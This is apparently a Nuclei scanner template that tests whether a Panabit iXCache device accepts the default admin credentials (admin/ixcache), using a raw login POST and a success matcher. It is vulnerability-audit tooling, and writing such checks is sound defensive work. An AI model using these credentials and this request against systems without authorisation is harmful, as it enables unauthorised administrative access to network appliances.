id: panabit-ixcache-default-login

info:
  name: Panabit iXCache - Admin Login Discovery
  author: ritikchaddha
  severity: high
  description: Panabit iXCache default admin login credentials were successful.
  reference:
    - http://forum.panabit.com/thread-10830-1-1.html
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
    cvss-score: 8.3
    cve-id:
    cwe-id: CWE-522
  tags: ixcache,default-login,panabit

requests:
  - raw:
      - |
        POST /login/userverify.cgi HTTP/1.1
        Host: {{Hostname}}

        username={{username}}&password={{password}}

    payloads:
      username:
        - admin
      password:
        - ixcache
    attack: pitchfork

    matchers-condition: and
    matchers:

      - type: word
        part: body
        words:
          - "URL=/cgi-bin/monitor.cgi"

      - type: status
        status:
          - 200

